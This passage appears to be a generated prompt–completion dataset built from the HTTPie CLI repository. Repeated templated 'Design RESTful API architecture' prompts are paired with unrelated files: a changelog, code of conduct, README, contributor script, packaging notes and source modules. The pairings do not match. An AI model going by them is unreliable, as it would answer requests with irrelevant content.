[0.4.1](https://github.com/httpie/cli/compare/0.4.0...0.4.1) (2013-02-26)\n\n- Fixed `setup.py`\n\n## [0.4.0](https://github.com/httpie/cli/compare/0.3.0...0.4.0) (2013-02-22)\n\n- Added Python 3.3 compatibility\n- Added Requests >= v1.0.4 compatibility\n- Added support for credentials in URL\n- Added `--no-option` for every `--option` to be config-friendly\n- Mutually exclusive arguments can be specified multiple times. The\n  last value is used\n\n## [0.3.0](https://github.com/httpie/cli/compare/0.2.7...0.3.0) (2012-09-21)\n\n- Allow output redirection on Windows\n- Added configuration file\n- Added persistent session support\n- Renamed `--allow-redirects` to `--follow`\n- Improved the usability of `http --help`\n- Fixed installation on Windows with Python 3\n- Fixed colorized output on Windows with Python 3\n- CRLF HTTP header field separation in the output\n- Added exit status code `2` for timed-out requests\n- Added the option to separate colorizing and formatting\n  (`--pretty=all`, `--pretty=colors` and `--pretty=format`)\n  `--ugly` has bee removed in favor of `--pretty=none`\n\n## [0.2.7](https://github.com/httpie/cli/compare/0.2.5...0.2.7) (2012-08-07)\n\n- Added compatibility with Requests 0.13.6\n- Added streamed terminal output. `--stream, -S` can be used to enable\n  streaming also with `--pretty` and to ensure a more frequent output\n  flushing\n- Added support for efficient large file downloads\n- Sort headers by name (unless `--pretty=none`)\n- Response body is fetched only when needed (e.g., not with `--headers`)\n- Improved content type matching\n- Updated Solarized color scheme\n- Windows: Added `--output FILE` to store output into a file\n  (piping results in corrupted data on Windows)\n- Proper handling of binary requests and responses\n- Fixed printing of `multipart/form-data` requests\n- Renamed `--traceback` to `--debug`\n\n## [0.2.6](https://github.com/httpie/cli/compare/0.2.5...0.2.6) (2012-07-26)\n\n- The short option for `--headers` is now `-h` (`-t` has been\n  removed, for usage use `--help`)\n- Form data and URL parameters can have multiple fields with the same name\n  (e.g.,`http -f url a=1 a=2`)\n- Added `--check-status` to exit with an error on HTTP 3xx, 4xx and\n  5xx (3, 4, and 5, respectively)\n- If the output is piped to another program or redirected to a file,\n  the default behaviour is to only print the response body\n  (It can still be overwritten via the `--print` flag.)\n- Improved highlighting of HTTP headers\n- Added query string parameters (`param==value`)\n- Added support for terminal colors under Windows\n\n## [0.2.5](https://github.com/httpie/cli/compare/0.2.2...0.2.5) (2012-07-17)\n\n- Unicode characters in prettified JSON now don't get escaped for\n  improved readability\n- --auth now prompts for a password if only a username provided\n- Added support for request payloads from a file path with automatic\n  `Content-Type` (`http URL @/path`)\n- Fixed missing query string when displaying the request headers via\n  `--verbose`\n- Fixed Content-Type for requests with no data\n\n## [0.2.2](https://github.com/httpie/cli/compare/0.2.1...0.2.2) (2012-06-24)\n\n- The `METHOD` positional argument can now be omitted (defaults to\n  `GET`, or to `POST` with data)\n- Fixed --verbose --form\n- Added support for Tox\n\n## [0.2.1](https://github.com/httpie/cli/compare/0.2.0...0.2.1) (2012-06-13)\n\n- Added compatibility with `requests-0.12.1`\n- Dropped custom JSON and HTTP lexers in favor of the ones newly included\n  in `pygments-1.5`\n\n## [0.2.0](https://github.com/httpie/cli/compare/0.1.6...0.2.0) (2012-04-25)\n\n- Added Python 3 support\n- Added the ability to print the HTTP request as well as the response\n  (see `--print` and `--verbose`)\n- Added support for Digest authentication\n- Added file upload support\n  (`http -f POST file_field_name@/path/to/file`)\n- Improved syntax highlighting for JSON\n- Added support for field name escaping\n- Many bug fixes\n\n## [0.1.6](https://github.com/httpie/cli/compare/0.1.5...0.1.6) (2012-03-04)\n\n- Fixed `setup.py`\n\n## [0.1.5](https://github.com/httpie/cli/compare/0.1.4...0.1.5) (2012-03-04)\n\n- Many improvements and bug fixes\n\n## [0.1.4](https://github.com/httpie/cli/compare/b966efa...0.1.4) (2012-02-28)\n\n- Many improvements and bug fixes\n\n## [0.1.0](https://github.com/httpie/cli/commit/b966efa) (2012-02-25)\n\n- Initial public release\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "CHANGELOG.md", "language": "markdown", "complexity": "complex", "star_count": 36176, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 463}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributor Covenant Code of Conduct\n\n## Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to making participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, sex characteristics, gender identity and expression,\nlevel of experience, education, socio-economic status, nationality, personal\nappearance, race, religion, or sexual identity and orientation.\n\n## Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n- Using welcoming and inclusive language\n- Being respectful of differing viewpoints and experiences\n- Gracefully accepting constructive criticism\n- Focusing on what is best for the community\n- Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n- The use of sexualized language or imagery and unwelcome sexual attention or\n  advances\n- Trolling, insulting/derogatory comments, and personal or political attacks\n- Public or private harassment\n- Publishing others' private information, such as a physical or electronic\n  address, without explicit permission\n- Other conduct which could reasonably be considered inappropriate in a\n  professional setting\n\n## Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n## Scope\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community. Examples of\nrepresenting a project or community include using an official project e-mail\naddress, posting via an official social media account, or acting as an appointed\nrepresentative at an online or offline event. Representation of a project may be\nfurther defined and clarified by project maintainers.\n\n## Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project team at jakub@roztocil.co. All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n## Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant](https://www.contributor-covenant.org),\nversion 1.4, available at <https://www.contributor-covenant.org/version/1/4/code-of-conduct.html>\n\nFor answers to common questions about this code of conduct, see\n<https://www.contributor-covenant.org/faq>\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "CODE_OF_CONDUCT.md", "language": "markdown", "complexity": "simple", "star_count": 36176, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 75}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<h2 align=\"center\">\n    <a href=\"https://httpie.io\" target=\"blank_\">\n        <img height=\"100\" alt=\"HTTPie\" src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-logo.svg\" />\n    </a>\n    <br>\n    HTTPie CLI: human-friendly HTTP client for the API era\n</h2>\n\n<div align=\"center\">\n\n[![HTTPie for Desktop](https://img.shields.io/static/v1?label=HTTPie&message=Desktop&color=4B78E6)](https://httpie.io/product)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=Web%20%26%20Mobile&color=73DC8C)](https://httpie.io/app)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=CLI&color=FA9BFA)](https://httpie.io/cli)\n[![Twitter](https://img.shields.io/twitter/follow/httpie?style=flat&color=%234B78E6&logoColor=%234B78E6)](https://twitter.com/httpie)\n[![Chat](https://img.shields.io/discord/725351238698270761?style=flat&label=Chat%20on%20Discord&color=%23FA9BFA)](https://httpie.io/discord)\n\n</div>\n\n\n<div align=\"center\">\n\n[![Docs](https://img.shields.io/badge/stable%20docs-httpie.io%2Fdocs%2Fcli-brightgreen?style=flat&color=%2373DC8C&label=Docs)](https://httpie.org/docs/cli)\n[![Latest version](https://img.shields.io/pypi/v/httpie.svg?style=flat&label=Latest&color=%234B78E6&logo=&logoColor=white)](https://pypi.python.org/pypi/httpie)\n[![Build](https://img.shields.io/github/actions/workflow/status/httpie/cli/tests.yml?branch=master&color=%23FA9BFA&label=Build)](https://github.com/httpie/cli/actions)\n[![Coverage](https://img.shields.io/codecov/c/github/httpie/cli?style=flat&label=Coverage&color=%2373DC8C)](https://codecov.io/gh/httpie/cli)\n[![PyPi downloads](https://img.shields.io/pepy/dt/httpie?style=flat&label=Downloads%20from%20PyPi%20only&color=4B78E6)](https://www.pepy.tech/projects/httpie)\n\n</div>\n\nHTTPie (pronounced _aitch-tee-tee-pie_) is a command-line HTTP client.\nIts goal is to make CLI interaction with web services as human-friendly as possible.\nHTTPie is designed for testing, debugging, and generally interacting with APIs & HTTP servers.\nThe `http` & `https` commands allow for creating and sending arbitrary HTTP requests.\nThey use simple and natural syntax and provide formatted and colorized output.\n\n<div align=\"center\">\n\n<img src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-animation.gif\" alt=\"HTTPie in action\" width=\"100%\"/>\n\n\n</div>\n\n\n\n\n## We lost 54k GitHub stars\n\nPlease note we recently accidentally made this repo private for a moment, and GitHub deleted our community that took a decade to build. Read the full story here: https://httpie.io/blog/stardust\n\n![](docs/stardust.png)\n\n\n## Getting started\n\n- [Installation instructions →](https://httpie.io/docs#installation)\n- [Full documentation →](https://httpie.io/docs)\n\n## Features\n\n- Expressive and intuitive syntax\n- Formatted and colorized terminal output\n- Built-in JSON support\n- Forms and file uploads\n- HTTPS, proxies, and authentication\n- Arbitrary request data\n- Custom headers\n- Persistent sessions\n- `wget`-like downloads\n\n[See all features →](https://httpie.io/docs)\n\n## Examples\n\nHello World:\n\n```bash\nhttps httpie.io/hello\n```\n\nCustom [HTTP method](https://httpie.io/docs#http-method), [HTTP headers](https://httpie.io/docs#http-headers) and [JSON](https://httpie.io/docs#json) data:\n\n```bash\nhttp PUT pie.dev/put X-API-Token:123 name=John\n```\n\nBuild and print a request without sending it using [offline mode](https://httpie.io/docs/cli/offline-mode):\n\n```bash\nhttp --offline pie.dev/post hello=offline\n```\n\nUse [GitHub API](https://developer.github.com/v3/issues/comments/#create-a-comment) to post a comment on an [Issue](https://github.com/httpie/cli/issues/83) with [authentication](https://httpie.io/docs#authentication):\n\n```bash\nhttp -a USERNAME POST https://api.github.com/repos/httpie/cli/issues/83/comments body='HTTPie is awesome! :heart:'\n```\n\n[See more examples →](https://httpie.io/docs#examples)\n\n## Community & support\n\n- Visit the [HTTPie website](https://httpie.io) for full documentation and useful links.\n- Join our [Discord server](https://httpie.io/discord) is to ask questions, discuss features, and for general API chat.\n- Tweet at [@httpie](https://twitter.com/httpie) on Twitter.\n- Use [StackOverflow](https://stackoverflow.com/questions/tagged/httpie) to ask questions and include a `httpie` tag.\n- Create [GitHub Issues](https://github.com/httpie/cli/issues) for bug reports and feature requests.\n- Subscribe to the [HTTPie newsletter](https://httpie.io) for occasional updates.\n\n## Contributing\n\nHave a look through existing [Issues](https://github.com/httpie/cli/issues) and [Pull Requests](https://github.com/httpie/cli/pulls) that you could help with. If you'd like to request a feature or report a bug, please [create a GitHub Issue](https://github.com/httpie/cli/issues) using one of the templates provided.\n\n[See contribution guide →](https://github.com/httpie/cli/blob/master/CONTRIBUTING.md)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 36176, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 114}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nGenerate the contributors database.\n\nFIXME: replace `requests` calls with the HTTPie API, when available.\n\"\"\"\nimport json\nimport os\nimport re\nimport sys\nfrom copy import deepcopy\nfrom datetime import datetime\nfrom pathlib import Path\nfrom subprocess import check_output\nfrom time import sleep\nfrom typing import Any, Dict, Optional, Set\n\nimport requests\n\nFullNames = Set[str]\nGitHubLogins = Set[str]\nPerson = Dict[str, str]\nPeople = Dict[str, Person]\nUserInfo = Dict[str, Any]\n\nCO_AUTHORS = re.compile(r'Co-authored-by: ([^<]+) <').finditer\nAPI_URL = 'https://api.github.com'\nREPO = OWNER = 'httpie'\nREPO_URL = f'{API_URL}/repos/{REPO}/{OWNER}'\n\nHERE = Path(__file__).parent\nDB_FILE = HERE / 'people.json'\n\nDEFAULT_PERSON: Person = {'committed': [], 'reported': [], 'github': '', 'twitter': ''}\nSKIPPED_LABELS = {'invalid'}\n\nGITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\nassert GITHUB_TOKEN, 'GITHUB_TOKEN envar is missing'\n\n\nclass FinishedForNow(Exception):\n    \"\"\"Raised when remaining GitHub rate limit is zero.\"\"\"\n\n\ndef main(previous_release: str, current_release: str) -> int:\n    since = release_date(previous_release)\n    until = release_date(current_release)\n\n    contributors = load_awesome_people()\n    try:\n        committers = find_committers(since, until)\n        reporters = find_reporters(since, until)\n    except Exception as exc:\n        # We want to save what we fetched so far. So pass.\n        print(' !! ', exc)\n\n    try:\n        merge_all_the_people(current_release, contributors, committers, reporters)\n        fetch_missing_users_details(contributors)\n    except FinishedForNow:\n        # We want to save what we fetched so far. So pass.\n        print(' !! Committers:', committers)\n        print(' !! Reporters:', reporters)\n        exit_status = 1\n    else:\n        exit_status = 0\n\n    save_awesome_people(contributors)\n    return exit_status\n\n\ndef find_committers(since: str, until: str) -> FullNames:\n    url = f'{REPO_URL}/commits'\n    page = 1\n    per_page = 100\n    params = {\n        'since': since,\n        'until': until,\n        'per_page': per_page,\n    }\n    committers: FullNames = set()\n\n    while 'there are commits':\n        params['page'] = page\n        data = fetch(url, params=params)\n\n        for item in data:\n            commit = item['commit']\n            committers.add(commit['author']['name'])\n            debug(' >>> Commit', item['html_url'])\n            for co_author in CO_AUTHORS(commit['message']):\n                name = co_author.group(1)\n                committers.add(name)\n\n        if len(data) < per_page:\n            break\n        page += 1\n\n    return committers\n\n\ndef find_reporters(since: str, until: str) -> GitHubLogins:\n    url = f'{API_URL}/search/issues'\n    page = 1\n    per_page = 100\n    params = {\n        'q': f'repo:{REPO}/{OWNER} is:issue closed:{since}..{until}',\n        'per_page': per_page,\n    }\n    reporters: GitHubLogins = set()\n\n    while 'there are issues':\n        params['page'] = page\n        data = fetch(url, params=params)\n\n        for item in data['items']:\n            # Filter out unwanted labels.\n            if any(label['name'] in SKIPPED_LABELS for label in item['labels']):\n                continue\n            debug(' >>> Issue', item['html_url'])\n            reporters.add(item['user']['login'])\n\n        if len(data['items']) < per_page:\n            break\n        page += 1\n\n    return reporters\n\n\ndef merge_all_the_people(release: str, contributors: People, committers: FullNames, reporters: GitHubLogins) -> None:\n    \"\"\"\n    >>> contributors = {'Alice': new_person(github='alice', twitter='alice')}\n    >>> merge_all_the_people('2.6.0', contributors, {}, {})\n    >>> contributors\n    {'Alice': {'committed': [], 'reported': [], 'github': 'alice', 'twitter': 'alice'}}\n\n    >>> contributors = {'Bob': new_person(github='bob', twitter='bob')}\n    >>> merge_all_the_people('2.6.0', contributors, {'Bob'}, {'bob'})\n    >>> contributors\n    {'Bob': {'committed': ['2.6.0'], 'reported': ['2.6.0'], 'github': 'bob', 'twitter': 'bob'}}\n\n    >>> contributors = {'Charlotte': new_person(github='charlotte', twitter='charlotte', committed=['2.5.0'], reported=['2.5.0'])}\n    >>> merge_all_the_people('2.6.0', contributors, {'Charlotte'}, {'charlotte'})\n    >>> contributors\n    {'Charlotte': {'committed': ['2.5.0', '2.6.0'], 'reported': ['2.5.0', '2.6.0'], 'github': 'charlotte', 'twitter': 'charlotte'}}\n\n    \"\"\"\n    # Update known contributors.\n    for name, details in contributors.items():\n        if name in committers:\n            if release not in details['committed']:\n                details['committed'].append(release)\n            committers.remove(name)\n        if details['github'] in reporters:\n            if release not in details['reported']:\n                details['reported'].append(release)\n            reporters.remove(details['github'])\n\n    # Add new committers.\n    for name in committers:\n        user_info = user(fullname=name)\n        contributors[name] = new_person(\n            github=user_info['login'],\n            twitter=user_info['twitter_username'],\n            committed=[release],\n        )\n        if user_info['login'] in reporters:\n            contributors[name]['reported'].append(release)\n            reporters.remove(user_info['login'])\n\n    # Add new reporters.\n    for github_username in reporters:\n        user_info = user(github_username=github_username)\n        contributors[user_info['name'] or user_info['login']] = new_person(\n            github=github_username,\n            twitter=user_info['twitter_username'],\n            reported=[release],\n        )\n\n\ndef release_date(release: str) -> str:\n    date = check_output(['git', 'log', '-1', '--format=%ai', release], text=True).strip()\n    return datetime.strptime(date, '%Y-%m-%d %H:%M:%S %z').isoformat()\n\n\ndef load_awesome_people() -> People:\n    try:\n        with DB_FILE.open(encoding='utf-8') as fh:\n            return json.load(fh)\n    except (FileNotFoundError, ValueError):\n        return {}\n\n\ndef fetch(url: str, params: Optional[Dict[str, str]] = None) -> UserInfo:\n    headers = {\n        'Accept': 'application/vnd.github.v3+json',\n        'Authentication': f'token {GITHUB_TOKEN}'\n    }\n    for retry in range(1, 6):\n        debug(f'[{retry}/5]', f'{url = }', f'{params = }')\n        with requests.get(url, params=params, headers=headers) as req:\n            try:\n                req.raise_for_status()\n            except requests.exceptions.HTTPError as exc:\n                if exc.response.status_code == 403:\n                    # 403 Client Error: rate limit exceeded for url: ...\n                    now = int(datetime.utcnow().timestamp())\n                    xrate_limit_reset = int(exc.response.headers['X-RateLimit-Reset'])\n                    wait = xrate_limit_reset - now\n                    if wait > 20:\n                        raise FinishedForNow()\n                    debug(' !', 'Waiting', wait, 'seconds before another try ...')\n                    sleep(wait)\n                continue\n            return req.json()\n    assert ValueError('Rate limit exceeded')\n\n\ndef new_person(**kwargs: str) -> Person:\n    data = deepcopy(DEFAULT_PERSON)\n    data.update(**kwargs)\n    return data\n\n\ndef user(fullname: Optional[str] = '', github_username: Optional[str] = '') -> UserInfo:\n    if github_username:\n        url = f'{API_URL}/users/{github_username}'\n        return fetch(url)\n\n    url = f'{API_URL}/search/users'\n    for query in (f'fullname:{fullname}', f'user:{fullname}'):\n        params = {\n            'q': f'repo:{REPO}/{OWNER} {query}',\n            'per_page': 1,\n        }\n        user_info = fetch(url, params=params)\n        if user_info['items']:\n            user_url = user_info['items'][0]['url']\n            return fetch(user_url)\n\n\ndef fetch_missing_users_details(people: People) -> None:\n    for name, details in people.items():\n        if details['github'] and details['twitter']:\n            continue\n        user_info = user(github_username=details['github'], fullname=name)\n        if not details['github']:\n            details['github'] = user_info['login']\n        if not details['twitter']:\n            details['twitter'] = user_info['twitter_username']\n\n\ndef save_awesome_people(people: People) -> None:\n    with DB_FILE.open(mode='w', encoding='utf-8') as fh:\n        json.dump(people, fh, indent=4, sort_keys=True)\n        fh.write(\"\\n\")\n\n\ndef debug(*args: Any) -> None:\n    if os.getenv('DEBUG') == '1':\n        print(*args)\n\n\nif __name__ == '__main__':\n    ret = 1\n    try:\n        ret = main(*sys.argv[1:])\n    except TypeError:\n        ret = 2\n        print(f'''\nFetch contributors to a release.\n\nUsage:\n    python {sys.argv[0]} {sys.argv[0]} <RELEASE N-1> <RELEASE N>\nExample:\n    python {sys.argv[0]} 2.4.0 2.5.0\n\nDefine the DEBUG=1 environment variable to enable verbose output.\n''')\n    except KeyboardInterrupt:\n        ret = 255\n    sys.exit(ret)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "docs/contributors/fetch.py", "language": "python", "complexity": "complex", "star_count": 36176, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 282}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# HTTPie on MacPorts\n\nWelcome to the documentation about **packaging HTTPie for MacPorts**.\n\n- If you do not know HTTPie, have a look [here](https://httpie.io/cli).\n- If you are looking for HTTPie installation or upgrade instructions on MacPorts, then you can find them on [that page](https://httpie.io/docs#macports).\n- If you are looking for technical information about the HTTPie packaging on MacPorts, then you are in a good place.\n\n## About\n\nThis document contains technical details, where we describe how to create a patch for the latest HTTPie version for MacPorts.\nWe will discuss setting up the environment, installing development tools, installing and testing changes before submitting a patch downstream.\n\n## Overall process\n\nOpen a pull request to update the [downstream file](https://github.com/macports/macports-ports/blob/master/net/httpie/Portfile) ([example](https://github.com/macports/macports-ports/pull/12583)).\n\n- Here is how to calculate the size and checksums (replace `2.5.0` with the correct version):\n\n  ```bash\n  # Download the archive\n  $ wget https://api.github.com/repos/httpie/cli/tarball/2.5.0\n\n  # Size\n  $ stat --printf=\"%s\\n\" 2.5.0\n  1105185\n\n  # Checksums\n  $ openssl dgst -rmd160 2.5.0\n  RIPEMD160(2.5.0)= 88d227d52199c232c0ddf704a219d1781b1e77ee\n  $ openssl dgst -sha256 2.5.0\n  SHA256(2.5.0)= 00c4b7bbe7f65abe1473f37b39d9d9f8f53f44069a430ad143a404c01c2179fc\n  ```\n\n- The commit message must be `httpie: update to XXX`.\n- The commit must be signed-off (`git commit -s`).\n\n## Hacking\n\n:construction: Work in progress.\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "docs/packaging/mac-ports/README.md", "language": "markdown", "complexity": "simple", "star_count": 36176, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 41}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# HTTPie on Chocolatey\n\nWelcome to the documentation about **packaging HTTPie for Chocolatey**.\n\n- If you do not know HTTPie, have a look [here](https://httpie.io/cli).\n- If you are looking for HTTPie installation or upgrade instructions on Chocolatey, then you can find them on [that page](https://httpie.io/docs#chocolatey).\n- If you are looking for technical information about the HTTPie packaging on Chocolatey, then you are in a good place.\n\n## About\n\nThis document contains technical details, where we describe how to create a patch for the latest HTTPie version for Chocolatey.\nWe will discuss setting up the environment, installing development tools, installing and testing changes before submitting a patch downstream.\n\n## Overall process\n\nAfter having successfully [built and tested](#hacking) the package, either trigger the\n[`Release on Chocolatey`](https://github.com/httpie/cli/actions/workflows/release-choco.yml) action\nto push it to the `Chocolatey` store or use the CLI:\n\n```bash\n# Replace 2.5.0 with the correct version\nchoco push httpie.2.5.0.nupkg -s https://push.chocolatey.org/ --api-key=API_KEY\n```\n\nBe aware that it might take multiple days until the release is approved, sine it goes through multiple\nsets of reviews (some of them are done manually).\n\n## Hacking\n\n```bash\n# Clone\ngit clone --depth=1 https://github.com/httpie/cli.git\ncd httpie/docs/packaging/windows-chocolatey\n\n# Build\nchoco pack\n\n# Check metadata\nchoco info httpie -s .\n\n# Install\nchoco install httpie -y -dv -s \"'.;https://community.chocolatey.org/api/v2/'\"\n\n# Test\nhttp --version\nhttps --version\n\n# Remove\nchoco uninstall -y httpie\n```\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "docs/packaging/windows-chocolatey/README.md", "language": "markdown", "complexity": "simple", "star_count": 36176, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 51}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from pathlib import Path\nfrom PyInstaller.utils.hooks import collect_all\n\ndef hook(hook_api):\n    for pkg in [\n        'pip',\n        'setuptools',\n        'distutils',\n        'pkg_resources'\n    ]:\n        datas, binaries, hiddenimports = collect_all(pkg)\n        hook_api.add_datas(datas)\n        hook_api.add_binaries(binaries)\n        hook_api.add_imports(*hiddenimports)\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "extras/packaging/linux/scripts/hooks/hook-pip.py", "language": "python", "complexity": "simple", "star_count": 36176, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 15}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nHTTPie: modern, user-friendly command-line HTTP client for the API era.\n\n\"\"\"\n\n__version__ = '3.2.4'\n__date__ = '2024-11-01'\n__author__ = 'Jakub Roztocil'\n__licence__ = 'BSD'\n", "metadata": {"source": "github.com/httpie/cli", "file_path": "httpie/__init__.py", "language": "python", "complexity": "simple", "star_count": 36176, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 10}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\nimport errno\nimport os\nimport re\nimport sys\nfrom argparse import RawDescriptionHelpFormatter\nfrom textwrap import dedent\nfrom urllib.parse import urlsplit\n\nfrom requests.utils import get_netrc_auth\n\nfrom .argtypes import (\n    AuthCredentials, SSLCredentials, KeyValueArgType,\n    PARSED_DEFAULT_FORMAT_OPTIONS,\n    parse_auth,\n    parse_format_options,\n)\nfrom .constants import (\n    HTTP_GET, HTTP_POST, BASE_OUTPUT_OPTIONS, OUTPUT_OPTIONS, OUTPUT_OPTIONS_DEFAULT,\n    OUTPUT_OPTIONS_DEFAULT_OFFLINE, OUTPUT_OPTIONS_DEFAULT_STDOUT_REDIRECTED,\n    OUT_RESP_BODY, PRETTY_MAP, PRETTY_STDOUT_TTY_ONLY, RequestType,\n    SEPARATOR_CREDENTIALS,\n    SEPARATOR_GROUP_ALL_ITEMS, SEPARATOR_GROUP_DATA_ITEMS, URL_SCHEME_RE,\n)\nfrom .exceptions import ParseError\nfrom .requestitems import RequestItems\nfrom ..context import Environment\nfrom ..plugins.registry import plugin_manager\nfrom ..utils import ExplicitNullAuth, get_content_type\n\n\nclass HTTPieHelpFormatter(RawDescriptionHelpFormatter):\n    \"\"\"A nicer help formatter.\n\n    Help for arguments can be indented and contain new lines.\n    It will be de-dented and arguments in the help\n    will be separated by a blank line for better readability.\n\n\n    \"\"\"\n\n    def __init__(self, max_help_position=6, *args, **kwargs):\n        # A smaller indent for args help.\n        kwargs['max_help_position'] = max_help_position\n        super().__init__(*args, **kwargs)\n\n    def _split_lines(self, text, width):\n        text = dedent(text).strip() + '\\n\\n'\n        return text.splitlines()\n\n    def add_usage(self, usage, actions, groups, prefix=None):\n        # Only display the positional arguments\n        displayed_actions = [\n            action\n            for action in actions\n            if not action.option_strings\n        ]\n\n        _, exception, _ = sys.exc_info()\n        if (\n            isinstance(exception, argparse.ArgumentError)\n            and len(exception.args) >= 1\n            and isinstance(exception.args[0], argparse.Action)\n        ):\n            # add_usage path is also taken when you pass an invalid option,\n            # e.g --style=invalid. If something like that happens, we want\n            # to include to action that caused to the invalid usage into\n            # the list of actions we are displaying.\n            displayed_actions.insert(0, exception.args[0])\n\n        super().add_usage(\n            usage,\n            displayed_actions,\n            groups,\n            prefix=\"usage:\\n    \"\n     